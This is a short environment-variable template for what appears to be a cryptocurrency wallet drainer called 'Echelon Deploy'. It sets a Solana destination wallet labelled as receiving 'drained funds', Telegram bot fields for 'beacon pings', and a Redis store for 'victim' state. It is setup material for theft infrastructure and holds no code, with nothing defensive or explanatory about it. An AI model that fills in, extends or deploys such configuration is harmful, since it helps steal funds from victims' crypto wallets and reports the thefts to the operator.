# Echelon Deploy Runtime Config
# Copy this file to .env and fill in real values before starting the server.

# Destination wallet that receives drained funds (Solana base58 address)
DRAIN_DEST=AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM

# Telegram bot token for beacon pings (leave blank to disable)
TG_TOK=

# Telegram chat ID to receive pings (leave blank to disable)
TG_CHAT=

# Optional: Vercel KV / Upstash Redis REST for persistent victim/config state.
# Leave blank to use in-memory state (resets on cold starts).
KV_REST_API_URL=
KV_REST_API_TOKEN=
